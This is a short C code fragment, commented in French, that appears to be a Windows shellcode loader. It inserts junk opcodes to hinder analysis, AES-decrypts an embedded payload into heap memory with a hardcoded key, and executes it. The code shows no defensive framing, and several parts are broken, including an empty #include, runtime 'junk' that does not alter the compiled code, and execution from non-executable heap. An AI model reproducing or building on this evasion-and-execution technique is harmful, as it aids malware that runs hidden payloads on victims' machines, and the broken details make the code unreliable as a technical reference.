#include 

// Insert des opcodes NOP aléatoires
void AddJunkCode() {
    int choice = rand() % 3;
    switch (choice) {
        case 0: __emit(0x90); break; // NOP
        case 1: __emit(0xEB, 0x00); break; // Short jump
        case 2: __emit(0xCC); break; // Int3
    }
}

// Déchiffre et exécute le shellcode
void LoadObfuscatedPayload(PVOID encrypted, SIZE_T size) {
    PVOID heap = HeapAlloc(GetProcessHeap(), 0, size);
    for (int i = 0; i < size; i += 32) {
        AddJunkCode();
        DecryptAESChunk((BYTE*)heap + i, (BYTE*)encrypted + i, "mySecretKey1234");
    }
    ((void(*)())heap)();
    WipeAESKey("mySecretKey1234", 16);
}